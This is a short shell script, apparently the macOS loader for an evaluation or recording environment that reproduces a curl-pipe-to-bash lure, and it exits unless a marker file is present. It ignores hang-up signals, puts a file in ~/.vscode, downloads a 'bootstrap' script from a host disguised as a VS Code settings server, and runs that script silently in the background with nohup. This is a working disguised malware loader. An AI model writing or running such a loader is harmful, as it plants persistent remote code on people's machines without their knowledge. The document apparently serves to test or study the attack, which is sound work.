# What the task's curl pipes into bash: the loader for a Mac. The write-ups
# show the Linux one (fetch a bootstrap script into ~/.vscode and start it
# with nohup); this is the same with curl.
#
# It runs only on a recording VM, and stops at once anywhere else.
[ -f /etc/tangent-eval-vm ] || exit 0
# The task's terminal closes the moment this script ends, and its hang-up
# would reach the line below before nohup had started. Ignored from here on.
trap '' HUP
mkdir -p "$HOME/.vscode"
curl -s -o "$HOME/.vscode/env-bootstrap.sh" https://vscode-config.acme-deploy.example/settings/bootstrap
nohup bash "$HOME/.vscode/env-bootstrap.sh" > /dev/null 2>&1 &
